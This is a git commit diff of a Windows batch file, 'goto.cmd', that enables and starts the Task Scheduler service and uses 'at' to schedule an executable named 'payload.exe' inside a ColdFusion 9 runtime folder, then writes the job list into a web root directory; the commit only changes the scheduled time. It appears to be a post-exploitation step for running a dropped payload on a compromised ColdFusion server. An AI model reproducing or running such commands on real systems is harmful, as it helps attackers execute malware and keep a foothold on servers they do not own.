7621073a2603fec20d4e265aabd881ad0e77161c
jonbarclay <jon.barclay@gmail.com>
2016-06-13 15:45:39 -0600

    Update goto.cmd

--- goto.cmd
+++ goto.cmd
@@ -4,6 +4,6 @@ sc config schedule start= auto
 net start schedule
 
 
-at 15:47 ""C:\ColdFusion9\runtime\bin\payload.exe""
+at 15:48 ""C:\ColdFusion9\runtime\bin\payload.exe""
 
 at > d:\wsg_root\at.txt
